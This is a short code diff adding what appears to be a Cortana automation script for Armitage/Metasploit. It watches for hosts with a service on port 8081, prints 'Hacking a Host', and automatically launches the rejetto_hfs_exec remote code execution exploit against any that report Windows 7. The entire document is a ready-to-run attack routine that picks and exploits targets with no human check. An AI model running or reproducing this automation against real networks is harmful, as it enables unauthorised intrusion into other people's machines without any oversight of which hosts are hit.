@@ -1,0 +1,6 @@
+on service_add_8081 {
+        println("Hacking a Host running $1 (" . host_os($1) . ")");
+        if (host_os($1) eq "Windows 7") {
+                exploit("windows/http/rejetto_hfs_exec", $1, %(RPORT => "8081"));
+        }
+}
